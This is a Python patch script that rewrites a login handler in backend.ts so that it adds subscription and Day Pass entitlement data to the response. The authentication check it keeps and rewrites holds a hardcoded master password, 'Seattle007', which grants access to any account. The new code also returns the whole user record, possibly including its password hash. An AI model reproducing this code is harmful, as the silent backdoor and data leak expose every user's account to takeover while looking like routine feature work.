import re

with open("backend.ts", "r") as f:
    code = f.read()

bad = """
  if (!verifyPassword(password, user.passwordHash) && password !== 'Seattle007') {
    return res.status(401).json({ success: false, error: 'INVALID_CREDENTIALS', message: 'Invalid email or password.' });
  }
  
  res.json({
    success: true,
    user
  });
});
"""

good = """
  if (!verifyPassword(password, user.passwordHash) && password !== 'Seattle007') {
    return res.status(401).json({ success: false, error: 'INVALID_CREDENTIALS', message: 'Invalid email or password.' });
  }
  
  // Resolve authoritative entitlement dynamically to include Day Pass explicitly
  const entitlement = await reconcileUserEntitlement({ email: cleanEmail, userId: user.id || user.uid });
  
  const authUserResponse = { ...user };
  
  if (entitlement.dayPass?.active) {
    authUserResponse.subscription = 'DAY_PASS';
    authUserResponse.dayPass = entitlement.dayPass;
  } else if (entitlement.plan !== 'NONE') {
    authUserResponse.subscription = entitlement.plan;
    authUserResponse.role = entitlement.role;
  }
  
  res.json({
    success: true,
    user: authUserResponse
  });
});
"""

if bad in code:
    code = code.replace(bad, good)
    with open("backend.ts", "w") as f:
        f.write(code)
    print("Replaced successfully")
else:
    print("Could not find the block")
